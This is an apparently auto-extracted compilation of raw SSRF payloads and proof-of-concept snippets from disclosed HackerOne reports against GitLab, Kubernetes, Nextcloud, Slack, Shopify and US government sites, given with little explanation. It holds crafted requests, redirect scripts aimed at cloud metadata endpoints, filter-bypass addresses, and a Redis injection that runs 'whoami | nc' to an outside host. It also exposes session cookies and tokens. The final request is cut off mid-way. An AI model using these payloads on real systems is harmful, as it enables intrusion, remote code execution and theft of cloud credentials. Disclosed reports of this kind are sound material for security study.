# SSRF — verbatim payloads/PoC snippets from disclosed HackerOne reports

Auto-extracted 2026-11-12 from `data/h1` (code blocks and raw HTTP requests in the reporter's own text). Top reports by bounty, then votes. Full context: the linked report file.

## #826361 SSRF on project import via the remote_attachment_url on a Note — gitlab — $10,000 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/826361.md` (https://hackerone.com/reports/826361)

```
mount_uploader :attachment, AttachmentUploader
```

```
  def remote_urls=(urls)
      return if not urls or urls == "" or urls.all?(&:blank?)

      @remote_urls = urls
      @download_error = nil
      @integrity_error = nil

      @uploaders = urls.zip(remote_request_headers || []).map do |url, header|
        uploader = blank_uploader
        uploader.download!(url, header || {})
        uploader
      end
```

```
    def file
          if @file.blank?
            headers = @remote_headers.
              reverse_merge('User-Agent' => "CarrierWave/#{CarrierWave::VERSION}")

            @file = Kernel.open(@uri.to_s, headers)
            @file = @file.is_a?(String) ? StringIO.new(@file) : @file
          end
```

## #776017 Half-Blind SSRF found in kube/cloud-controller-manager can be upgraded to complete SSRF (fully crafted HTTP requests) in vendor managed k8s service. — kubernetes — $5,000 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/776017.md` (https://hackerone.com/reports/776017)

```
apiVersion: storage.k8s.io/v1
kind: StorageClass
metadata:
name: poc-ssrf
provisioner: kubernetes.io/glusterfs
parameters:
resturl: "http://bzh.ovh:6666/#"
clusterid: "630372ccdc720a92c681fb928f27b53f"
restauthenabled: "true"
restuser: "admin"
secretNamespace: "default"
secretName: "poc-ssrf-secret"
gidMin: "40000"
gidMax: "50000"
volumetype: "replicate:3"
---
apiVersion: v1
data:
key: bXlwYXNzd29yZA==
kind: Secret
metadata:
name: poc-ssrf-secret
namespace: default
type: kubernetes.io/glusterfs
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: poc-ssrf
spec:
accessModes:
- ReadWriteOnce
volumeMode: Filesystem
resources:
requests:
storage: 8Gi
storageClassName: poc-ssrf
```

```
kubectl create -f sc-poc.yam
```

```
kubectl describe pvc xxx
```

## #398799 Unauthenticated blind SSRF in OAuth Jira authorization controller — gitlab — $4,000 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/398799.md` (https://hackerone.com/reports/398799)

```
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
```

```
Listening on [0.0.0.0] (family 0, port 81)
Connection from [35.231.137.154] port 81 [tcp/*] accepted (family 2, sport 58558)
��ؒ����
��/$����4�i�,�֟J%>�+�/�,�0�����#�'�	��$�(�
�gk39@j28��<=/5�l162.243.147.21

 Connection closed, listening again.
```

```
def access_token
  auth_params = params
                  .slice(:code, :client_id, :client_secret)
                  .merge(grant_type: 'authorization_code', redirect_uri: oauth_jira_callback_url)

  auth_response = Gitlab::HTTP.post(oauth_token_url, body: auth_params, allow_local_requests: true)
  token_type, scope, token = auth_response['token_type'], auth_response['scope'], auth_response['access_token']

  render text: "access_token=#{token}&scope=#{scope}&token_type=#{token_type}"
end
```

## #374737 Blind SSRF on errors.hackerone.net due to Sentry misconfiguration — security — $3,500 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2018/374737.md` (https://hackerone.com/reports/374737)

```
POST /api/30/csp-report/?sentry_key=61c1e2f50d21487c97a071737701f598
```

```
POST /api/30/store/?sentry_version=7&sentry_client=raven-js%2F3.25.2&sentry_key=61c1e2f50d21487c97a071737701f598
```

```
curl -i -s -k  -X $'POST' \
    -H $'Host: errors.hackerone.net' -H $'Connection: close' -H $'Content-Length: 9031' -H $'Origin: https://hackerone.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36' -H $'Content-Type: application/csp-report' -H $'Accept: */*' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7' \
    --data-binary $'{\"project\":\"30\",\"logger\":\"javascript\",\"platform\":\"javascript\",\"request\":{\"headers\":{\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\",\"Referer\":\"https://avtohanter.ru/Business/Contractors/ContractorInfo?sessionid=40030075&id=da89ae9a-b2b7-4412-a5b0-6764f0c6556c\"},\"url\":\"https://avtohanter.ru/Business/Contractors/EditContractor?id=da89ae9a-b2b7-4412-a5b0-6764f0c6556c&sessionId=40030075\"},\"exception\":{\"values\":[{\"type\":\"Error\",\"value\":\"Trying to get control scope but angular isn\'t ready yet or something like this\",\"stacktrace\":{\"frames\":[{\"filename\":\"https://avtohanter.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js\",\"lineno\":110,\"colno\":81071,\"function\":\"XMLHttpRequest.o\",\"in_app\":true},{\"filename\":\"https://avtohanter.ru/dist/vendor.bundle.eec570ee672e4b47c7a2.js\",\"lineno\":96,\"colno\":75069,\"function\":\"XMLHttpRequest.<anonymous>\",\"in_app\":true},{\"filename\":\"https://avtoha
```

## #855276 Injection of `http.<url>.*` git config settings leading to SSRF — gitlab — $3,000 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/855276.md` (https://hackerone.com/reports/855276)

```
flags = append(flags, git.ValueFlag{Name: "-c", Value: fmt.Sprintf("http.%s.extraHeader=%s", u.String(), authHeader)})
```

```
git clone --bare -c http.followRedirects=false -c 'http.http://example.com/repo.git.extraHeader=Authorization: Basic YWE6YmI=' -- http://example.com/repo.git /repo/path
```

```
    sudo cat /var/opt/gitlab/git-data/repositories/@hashed/fc/56/fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a.git/config
    [core]
        repositoryformatversion = 0
        filemode = true
        bare = true
    [http]
        followredirects = false
    [http "http://google.com/"]
        proxy = http://proxy.aw.rs:8500.extraHeader=Authorization: Basic dXNlcg==
    
```

## #2301565 Server Side Request Forgery (SSRF) in webhook functionality — security — $2,500 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2024/2301565.md` (https://hackerone.com/reports/2301565)

```
<?php
// Obtén los datos de la solicitud
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept");
header("Content-Type: application/json");
header("Location: http://[::ffff:a9fe:a9fe]"); //IPV6 Compressed
?>
```

## #446593 GitLab's GitHub integration is vulnerable to SSRF vulnerability — gitlab — $2,000 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/446593.md` (https://hackerone.com/reports/446593)

```
# This file is a template, and might need editing before it works on your project.
# see https://docs.gitlab.com/ce/ci/yaml/README.html for all available options

# you can delete this line if you're not using Docker
image: busybox:latest

before_script:
  - echo "Before script section"
  - echo "For example you might run an update here or install a build dependency"
  - echo "Or perhaps you might print out some debugging details"
   
after_script:
  - echo "After script section"
  - echo "For example you might do some cleanup here"
   
build1:
  stage: build
  script:
    - echo "Do your build here"
   
test1:
  stage: test
  script: 
    - echo "Do a test here"
    - echo "For example run a test suite"
   
test2:
  stage: test
  script: 
    - echo "Do another parallel test here"
    - echo "For example run a lint test"
   
deploy1:
  stage: deploy
  script:
    - echo "Do your deploy here"
```

```
POST /api/v3/repos/1/2/statuses/5509244fe4919b85f5c1e0e1a2340805055c32d9 HTTP/1.1
Accept: application/vnd.github.v3+json
User-Agent: Octokit Ruby Gem 4.9.0
Content-Type: application/json
Authorization: token 1
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Connection: close
Host: remote_ip
Content-Length: 158

{"context":"ci/gitlab/master","description":"Pipeline passed on GitLab","target_url":"https://gitlab.com/jobertabma/123/pipelines/36992118","state":"success"}
```

```
HTTP/1.1 302 Found
Location: http://127.0.0.1/
Connection: Close
Content-Length: 0
```

## #1624140 SSRF to read AWS metaData at https://█████/ [HtUS] — deptofdefense — $1,000 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2022/1624140.md` (https://hackerone.com/reports/1624140)

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
```

```
{
  "Code" : "Success",
  "LastUpdated" : "2022-07-04T11:22:59Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "███",
  "SecretAccessKey" : "████",
  "Token" : "████
  
```

## #1544133 SSRF vulnerability can be exploited when a hijacked aggregated api server such as metrics-server returns 30X — kubernetes — $1,000 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2022/1544133.md` (https://hackerone.com/reports/1544133)

```
2022/04/16 00:30:13 src IP: 20.51.80.40:4096
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer <omitted>
User-Agent: azurepolicyaddon/v0.0.0 (linux/amd64) kubernetes/$Format

GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/vnd.kubernetes.protobuf, */*
Authorization: Bearer <omitted>
User-Agent: kube-controller-manager/v1.17.13 (linux/amd64) kubernetes/f4a8e76/system:serviceaccount:kube-system:generic-garbage-collector

2022/04/16 00:34:37 src IP: 20.69.190.88:21504
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer  <omitted>
User-Agent: cpmonitor/v0.0.0 (linux/amd64) kubernetes/$Format
```

```
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer <omitted>
User-Agent: azurepolicyaddon/v0.0.0 (linux/amd64) kubernetes/$Format

GET / HTTP/1.1
```

```
GET / HTTP/1.1
Host: 20.85.59.5
Accept: application/json, */*
Accept-Encoding: gzip
Authorization: Bearer  <omitted>
User-Agent: cpmonitor/v0.0.0 (linux/amd64) kubernetes/$Format
'''

  * [attachment / reference]
```

## #299473 Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook — gitlab — $750 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2018/299473.md` (https://hackerone.com/reports/299473)

```
POST /root/test/hooks HTTP/1.1
Host: gitlab-instance
...
----------1282688597
Content-Disposition: form-data; name="hook[url]"

http://127.0.0.1:6379/
----------1282688597
Content-Disposition: form-data; name="hook[token]"

A
...
```

```
A
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
```

```
POST / HTTP/1.1
Content-Type: application/json
X-Gitlab-Event: Push Hook
X-Gitlab-Token: A
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
Connection: close
Host: 192.241.233.143
Content-Length: 2495

{"object_kind":"push","ev<...>
```

## #843256 Open TURN relay abuse is possible due to lack of peer access control (Critical) — 8x8-bounty — $700 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/843256.md` (https://hackerone.com/reports/843256)

```
proxychains -f config telnet 127.0.0.1 5766
[proxychains] config file found: config
[proxychains] preloading /usr/lib64/proxychains-ng/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.13
Trying 127.0.0.1...
[proxychains] Dynamic chain  ...  127.0.0.1:9999  ...  127.0.0.1:5766  ...  OK
Connected to 127.0.0.1.
Escape character is '^]'.

> pc

  verbose: ON
  daemon process: ON
  stale-nonce: ON (*)
  stun-only: OFF (*)
  no-stun: OFF (*)
  secure-stun: OFF (*)
  do-not-use-config-file: OFF
  RFC5780 support: ON
  net engine version: 3
  net engine: UDP thread per CPU core
  enforce fingerprints: OFF
  mobility: OFF (*)
  udp-self-balance: OFF
  pidfile: /var/run/turnserver.pid
  process user ID: 0
  process group ID: 0
  process dir: /

  cipher-list: DEFAULT
  ec-curve-name: empty
  DH-key-length: 1066
  Certificate Authority file: empty
  Certificate file: /████████.crt
  Private Key file: /███.key
  Listener addr: 127.0.0.1
  Listener addr: ██████
  Listener addr: ::1
  Listener addr: ███████
  no-udp: OFF
  no-tcp: OFF
  no-dtls: OFF
  no-tls: OFF
  TLSv1.0: ON
    TLSv1.1: ON
  TLSv1.2: ON
  listener-port: 443
  tls-listener-port: 5349
  alt-listener-port: 0
  alt-tls-listener-port: 0


  Relay addr: █████
  Relay addr: ██████████
  server-relay: OFF
  no-udp-relay: OFF (*)
  no-tcp-relay: OFF (*)
  min-port: 49152
  max-port: 65535
  no-multicast-peers: OFF (*)
  no-loopback-peers: OFF (*)

  DB type: SQLite
  DB: /var/lib/turn/turndb

  Default realm: █████
  
```

```
    - making use of Chrome's devtools 
    - open the network tab, filter just WS connections
    - in the `xmpp-websocket` messages, set a filter for `type='turn'`
    - observe the TURN hostname and credentials
```

## #223203 SVG Server Side Request Forgery (SSRF) — shopify — $500 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2017/223203.md` (https://hackerone.com/reports/223203)

```
POST /admin/products/9577763394/images.json HTTP/1.1
Host: 667667.myshopify.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: en-US,en;q=0.5
X-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==
X-Requested-With: XMLHttpRequest
Content-Length: 671
Content-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741
Cookie: <REDACTED>
Connection: close

-----------------------------1184233411771235065729422741
Content-Disposition: form-data; name="image[attachment]"; filename="NagKSvgXlink2.png"
Content-Type: image/svg+xml

<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="http://<EXAMPLE_SERVER>/image.jpeg" /></svg>
-----------------------------1184233411771235065729422741
Content-Disposition: form-data; name="image[alt]"


-----------------------------1184233411771235065729422741--
```

```
HTTP/1.1 422 Unprocessable Entity
Server: nginx
Date: Fri, 21 Apr 2017 11:17:02 GMT
Content-Type: application/json; charset=utf-8
Connection: close
Referrer-Policy: origin-when-cross-origin
X-Frame-Options: DENY
X-ShopId: 19430493
X-ShardId: 1
X-Stats-UserId: 110274114
Cache-Control: no-cache, no-store
Set-Cookie: request_method=POST; path=/
Content-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=admin&source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=
```

```
GET /image.jpeg HTTP/1.0
Host: <EXAMPLE_SERVER>
Accept-Encoding: gzip 
```

## #895696 Blind SSRF on https://labs.data.gov/dashboard/Campaign/json_status/ Endpoint — gsa_bbp — $300 — Use of Inherently Dangerous Function
Source: `hackerone/reports/2020/895696.md` (https://hackerone.com/reports/895696)

```
    public function json_status($status, $real_url = null, $component = null)
```

```
root@vps778339:/var/www/html# cat o.php
<?php
$s = $_GET["s"];
header("Location: ".$s);
?>
```

```
GET /dashboard/Campaign/json_status/%68%74%74%70%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%2f%6f%2e%70%68%70%3f%73%3d%67%6f%70%68%65%72%3a%2f%2f%35%31%2e%31%37%38%2e%34%37%2e%31%37%36%3a%32%35%2f%5f%48%45%4c%4f%25%32%30%74%65%73%74%2e%6f%72%67%25%32%35%30%64%25%32%35%30%61%4d%41%49%4c%25%32%30%46%52%4f%4d%3a%25%32%30%25%32%35%30%64%25%32%35%30%61%52%43%50%54%25%32%30%54%4f%3a%6b%6f%6e%74%61%6b%74%40%64%65%65%70%73%65%63%2e%70%6c%25%32%35%30%64%25%32%35%30%61%44%41%54%41%25%32%35%30%64%25%32%35%30%61%54%65%73%74%25%32%35%30%64%25%32%35%30%61%2e HTTP/1.1
Host: labs.data.gov
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://labs.data.gov/
Origin: https://labs.data.gov
Connection: close
Cookie: citrix_ns_id=Hy43iMSeu576Lp58094fjUHkl800002; citrix_ns_id_.data.gov_%2F_wat=AAAAAAV4ytKcmI9TQbtC6F-69voRSIbVjCK07dl7qXIBbQ5EmPBKsIBouZogVupHcU2zOox8StZ7pRKbC-9vZwDFhBiC&; citrix_ns_id_.data.gov_%2F_wlf=AAAAAAU-prV_gslbEzfmUonFMegl6K4rwWmSb0AgGNdOiu_KqZxNqS7MTRJH4E2khZ1I1H_vxi62MjWDVm1NE0tFYVz1ScfnzhNtqiMZKEubTi-1PQ==&AAAAAAVVAacibcMeQaa-JKcUyH-R0itjt2o5kIUgVaclQb7SjFgL4eFSChKpRUFWw5I6mpFBaG331jUn5d3UQLI_WQvnxl7pF0SjzIKjWb9DdUnLhg==&; PHPSESSID=e8f8976b883b67ce8a7e5adad97720f5; SimpleSAMLSessionID=c58916c46288786181646876f8540efb; ci_
```

## #850114 SSRF in notifications.server configuration — phabricator — $300 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/850114.md` (https://hackerone.com/reports/850114)

```
[
  {
    "type": "client",
    "host": "phabricator.mycompany.com",
    "port": 22280,
    "protocol": "https"
  },
  {
    "type": "admin",
    "host": "X.X.X.X",
    "port": 22281,
    "protocol": "http"
  }
]
```

```
<?php
header("Location: http://anywere.loc/bad_intentions");
?>
```

```
    "type": "client",
    "host": "phabricator.mycompany.com",
    "port": 22280,
    "protocol": "https"
```

## #53088 SSRF vulnerability (access to metadata server on EC2 and OpenStack) — phabricator — $300 — Information Disclosure
Source: `hackerone/reports/2015/53088.md` (https://hackerone.com/reports/53088)

```
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/user-data
```

## #1702864 SSRF via filter bypass due to lax checking on IPs — nextcloud — $250 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2023/1702864.md` (https://hackerone.com/reports/1702864)

```
	public function ThrowIfLocalIp(string $ip) : void {
		$localRanges = [
			'100.64.0.0/10', // See RFC 6598
			'192.0.0.0/24', // See RFC 6890
		];
		if (
			(bool)filter_var($ip, FILTER_VALIDATE_IP) &&
			(
				!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
				IpUtils::checkIp($ip, $localRanges)
			)) {
			$this->logger->warning("Host $ip was not connected to because it violates local access rules");
			throw new LocalServerException('Host violates local access rules');
		}

		// Also check for IPv6 IPv4 nesting, because that's not covered by filter_var
		if ((bool)filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && substr_count($ip, '.') > 0) {
			$delimiter = strrpos($ip, ':'); // Get last colon
			$ipv4Address = substr($ip, $delimiter + 1);

			if (
				!filter_var($ipv4Address, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
				IpUtils::checkIp($ip, $localRanges)) {
				$this->logger->warning("Host $ip was not connected to because it violates local access rules");
				throw new LocalServerException('Host violates local access rules');
			}
		}
	}
```

```
<?php
      require 'vendor/autoload.php';
      use Symfony\Component\HttpFoundation\IpUtils;

      function ThrowIfLocalIp(string $ip) : void {
        $localRanges = [
            '100.64.0.0/10', // See RFC 6598
            '192.0.0.0/24', // See RFC 6890
        ];
        if (
            (bool)filter_var($ip, FILTER_VALIDATE_IP) &&
            (
                !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
                IpUtils::checkIp($ip, $localRanges)
            )) {
            throw new Exception('Host violates local access rules');
        }

        // Also check for IPv6 IPv4 nesting, because that's not covered by filter_var
        if ((bool)filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6) && substr_count($ip, '.') > 0) {
            $delimiter = strrpos($ip, ':'); // Get last colon
            $ipv4Address = substr($ip, $delimiter + 1);

            if (
                !filter_var($ipv4Address, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) ||
                IpUtils::checkIp($ip, $localRanges)) {
                throw new Exception('Host violates local access rules');
            }
        }
        echo "Pass";
    }
    ThrowIfLocalIp($_GET["ip"])
?>
```

```
      require 'vendor/autoload.php';
      use Symfony\Component\HttpFoundation\IpUtils;
```

## #1608039 SSRF via potential filter bypass with too lax local domain checking — nextcloud — $250 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2022/1608039.md` (https://hackerone.com/reports/1608039)

```
		// Disallow localhost and local network
		if ($host === 'localhost' || substr($host, -6) === '.local' || substr($host, -10) === '.localhost') {
			$this->logger->warning("Host $host was not connected to because it violates local access rules");
			throw new LocalServerException('Host violates local access rules');
		}
```

```
		// Disallow hostname only
		if (substr_count($host, '.') === 0 && !(bool)filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
			$this->logger->warning("Host $host was not connected to because it violates local access rules");
			throw new LocalServerException('Host violates local access rules');
		}
```

## #514224 SSRF in Search.gov via ?url= parameter — gsa_bbp — $150 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/514224.md` (https://hackerone.com/reports/514224)

```
    GET /help_docs?url=https%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
    Host: search.usa.gov
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: ja,en-US;q=0.7,en;q=0.3
    Accept-Encoding: gzip, deflate, br
    Referer: https://search.usa.gov/account
    X-NewRelic-ID: VgYAV1BRCxABU1JUBAUCXlI=
    X-CSRF-Token: /2jDOc6aYEZA5VealIrF44qJZtY0iDiTsALu8HYA+OOIewuKHREwyh6M0wGa2WC9amTPX4vPMjj0YQIjys3nNA==
    X-Requested-With: XMLHttpRequest
    Connection: close
    Cookie: _ga=GA1.2.924676610.1553290937; _gid=GA1.2.1047460386.1553290937; _ga=GA1.3.924676610.1553290937; _gid=GA1.3.1047460386.1553290937; _session_id=a0d5ecbfa9404ea9ffad4cb3ea771dea; user_credentials=1055608db95b714d9ae2ef05a4e1b83aa138ad5fca67422f02ca795ec2a74179bb15c610dd33f5e6f200be0de0e812a8fe3d59a0027b290b5377ab2a65da1f19%3A%3A5992
    
```

```
    GET /help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Fsearch.gov%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
    
```

```
    HTTP/1.1 200 OK
    (snip)
    {"body":"<div class='alert alert-error'>Unable to retrieve <a href='http://127.0.0.1:21/?\nhttps://search.gov/manual/account.html'>http://127.0.0.1:21/?\nhttps://search.gov/manual/account.html</a>.</div>"}
    
```

## #736867 SSRF protection bypass — nextcloud — $100 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2020/736867.md` (https://hackerone.com/reports/736867)

```
    http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
```

```
    python nextcloud_ssrf.py http://192.168.0.105/nextcloud/nextcloud/ admin "[password]" http://[0:0:0:0:0:ffff:127.0.0.1]:80/secret.ics
    BEGIN:VCALENDAR
    VERSION:2.0
    PRODID:-//hacksw/handcal//NONSGML v1.0//EN
    BEGIN:VEVENT
    UID:uid1@example.com
    DTSTAMP:19970714T170000Z
    ORGANIZER;CN=John Doex:MAILTO:john.doe@example.com
    DTSTART:19970714T170000Z
    DTEND:19970715T035959Z
    SUMMARY:Bastille Day Party
    GEO:48.85299;2.36885
    END:VEVENT
    END:VCALENDAR
```

## #61312 Bypass of the SSRF protection (Slack commands, Phabricator integration) — slack — $100 — None
Source: `hackerone/reports/2016/61312.md` (https://hackerone.com/reports/61312)

```
    POST /services/4814366410 HTTP/1.1
    Host: agarri.slack.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Referer: https://agarri.slack.com/services/4814366410?updated=1
    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
    Connection: keep-alive
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 148
    
    crumb=s-1431286469-c73f073ed6-%E2%98%83&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:25/&method=GET&in_autocomplete=on&desc=&usage=&label=
```

```
    POST /api/chat.command?t=1431286754 HTTP/1.1
    Host: agarri.slack.com
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Referer: https://agarri.slack.com/messages/general/
    Content-Length: 133
    Cookie: a-4829527691=lXNoz55pPZJJprlgeR9HwDESdmtwYmeB1FBbV17QKuaT7NQ%2BzYK9ugAawkjnMOTb3INz7JKDJiWMXMt3M6O3dQ%3D%3D; a=4829527691
    Connection: keep-alive
    Pragma: no-cache
    Cache-Control: no-cache
    
    agent=webapp&command=/ssrf&text=&channel=C04QDFHLT&token=xoxs-4829527689-4829527691-4814341714-d0346ec616&set_active=true&_attempts=1
```

```
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: *
    Cache-Control: private, no-cache, no-store, must-revalidate
    Content-Type: application/json; charset=utf-8
    Date: Mon, 11 May 2015 20:28:06 GMT
    Expires: Mon, 26 Jul 1997 05:00:00 GMT
    Pragma: no-cache
    Server: Apache
    Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
    Vary: Accept-Encoding
    X-Accepted-OAuth-Scopes: post
    X-Content-Type-Options: nosniff
    X-OAuth-Scopes: identify,read,post,client,admin
    X-XSS-Protection: 0
    Content-Length: 120
    Connection: keep-alive
    
    {"ok":true,"response":"220 squid3.tinyspeck.com ESMTP Postfix\r\n221 2.7.0 Error: I can break rules, too. Goodbye.\r\n"}
```

## #427835 Server-Side request forgery in New-Subscription feature of the calendar app — nextcloud — $100 — Server-Side Request Forgery (SSRF)
Source: `hackerone/reports/2019/427835.md` (https://hackerone.com/reports/427835)

```
    GET /nextcloud/nextcloud/index.php/apps/calendar/v1/proxy?url=http%3A%2F%2Flocalhost%2Fsecret HTTP/1.1
```

## #228377 SSRF in upload IMG through URL — discourse — $64 — Information Disclosure
Source: `hackerone/reports/2017/228377.md` (https://hackerone.com/reports/228377)

```
POST /posts HTTP/1.1
Host: try.discourse.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-CSRF-Token: 1QJrm4k6xUHhUyhoEJUElbbSVsufYPnbQd8N+Jti7/TtHEJxOpfDairKu0ufS/ovBIWt/mtdISC36Tx8OMdD/w==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Discourse-Visible: true
X-Requested-With: XMLHttpRequest
Referer: https://try.discourse.org/t/adsadas/835/7
Content-Length: 437
